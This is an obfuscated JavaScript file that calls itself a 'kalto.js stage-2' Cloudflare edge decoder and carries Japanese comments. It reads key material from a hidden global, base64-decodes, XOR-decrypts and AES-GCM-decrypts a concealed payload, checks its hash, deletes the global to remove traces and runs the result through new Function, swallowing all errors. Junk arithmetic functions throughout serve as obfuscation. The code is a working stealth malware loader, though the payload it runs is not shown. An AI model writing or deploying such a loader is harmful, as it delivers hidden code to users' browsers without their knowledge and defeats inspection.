// kalto.js stage-2 / Cloudflare D1 edge decoder
// 内部で第1段ペイロードを解凍し、ローカルランタイムにマウントします。
(function(){
function _ILBhiIevP3(){ return (3908|115^654^24^624-125+406)>>>0; }
function _uf9lKjWKIo(){ return (4125+306+752^201)>>>0; }
function _YFGYdQyTrc(){ return (2156|543-393&594+308)>>>0; }
function _jsbHqnOXNS(){ return (3645&922&161|25+978)>>>0; }
function _x3xT6clYSy(){ return (8690^690&951-891+453|240&572|754)>>>0; }
var G=window["__kalto_q_5c0932c9"];
if(!G){ return; }
function _fshoIkgeE8(){ return (4899+442-72&197)>>>0; }
function _kNyXUKSNQg(){ return (7276|986|155&36|545)>>>0; }
function _nqYjvlhw0A(){ return (2919&829-103^600)>>>0; }
function _54XlLxIH7N(){ return (516|1^855+402&510+524-583)>>>0; }
// シャッフル配列復元
function unshuffle(arr, map){
  var out=new Array(arr.length);
  for(var i=0;i<map.length;i++){ out[map[i]]=arr[i]; }
  return new Uint8Array(out);
}
var KEY  = unshuffle(G.b, G.c);
var IV   = unshuffle(G.d, G.e);
var SALT = unshuffle(G.f, G.g);
var XPAD = unshuffle(G.h, G.i);
function _o5kct6D3z0(){ return (9279-589-783&208&40+447)>>>0; }
function _9sThtUK633(){ return (124^703&762+650&746+498)>>>0; }
function _bkDjJa7cMf(){ return (6574&836^451&569+441)>>>0; }
function _vvEvi36fmx(){ return (6326+102&862|266|622+470+742)>>>0; }
// Base64連結→Uint8Array
var b64 = G.a.join("");
var bin = atob(b64);
var ct_xor = new Uint8Array(bin.length);
for(var i=0;i<bin.length;i++) ct_xor[i] = bin.charCodeAt(i);
// XOR復号
var ct = new Uint8Array(ct_xor.length);
for(var j=0;j<ct_xor.length;j++) ct[j] = ct_xor[j] ^ XPAD[j % XPAD.length];
function _6kzkZKcvNg(){ return (4349&199+989&54|315-22)>>>0; }
function _mCcfug6ZKA(){ return (2304-781+691|236|54|243^129)>>>0; }
function _c78fEDQimv(){ return (3211|281+893&215^80+706)>>>0; }
// AES-GCM復号
(async function(){
  try{
    var ck = await crypto.subtle.importKey("raw", KEY, {name:"AES-GCM"}, false, ["decrypt"]);
    var pt = await crypto.subtle.decrypt({name:"AES-GCM", iv:IV}, ck, ct);
    var ptBytes = new Uint8Array(pt);
    // 整合性チェック (バイト単位)
    if(ptBytes.length !== G.j) return;
    var hashBuf = await crypto.subtle.digest("SHA-256", ptBytes);
    var hashArr = Array.from(new Uint8Array(hashBuf));
    var hashHex = hashArr.map(function(b){return ("0"+b.toString(16)).slice(-2);}).join("").slice(0,32);
    if(hashHex !== G.k) return;
    var src = new TextDecoder("utf-8").decode(ptBytes);
    // 痕跡削除
    try{ delete window["__kalto_q_5c0932c9"]; }catch(_){}
    // 実行: new Function で間接eval（strictモード隔離）
    (new Function(src))();
  }catch(e){
    // 静黙
  }
})();
function _S4cTJ8iBaw(){ return (701-836-102^355|155)>>>0; }
function _FzG4OQakjI(){ return (9252|531+296|286^150-511-297)>>>0; }
function _NoNfoHAIvI(){ return (1521^559-283^617|770|515&479)>>>0; }
function _KDYSyw2HKc(){ return (5207&373&822-787+323+780-477)>>>0; }
function _U2wcU2tj1H(){ return (5821&882|242-423-78|427^717)>>>0; }
})();
